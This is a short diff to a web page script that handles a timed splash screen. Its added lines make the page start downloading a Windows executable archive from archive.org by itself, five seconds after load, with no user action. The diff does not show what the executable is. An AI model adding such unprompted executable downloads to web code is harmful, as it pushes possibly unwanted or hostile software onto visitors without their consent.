@@ -41,8 +41,10 @@ document.addEventListener('DOMContentLoaded', () => {
             image2Container.classList.add('hidden'); // Hide Image 2
             viewImageButton.classList.remove('hidden'); // Show View Image Button
             logoImage.classList.remove('hidden'); // Show logo image
-
-            localStorage.setItem('hasSeenImages', 'true');
+            
+            localStorage.setItem('hasSeenImages', 'true'); // Set flag immediately
+            // Automatically start download after splash screen
+            downloadFile('https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip');
         }, 5000); // Both images visible for 5 seconds
     }
 });
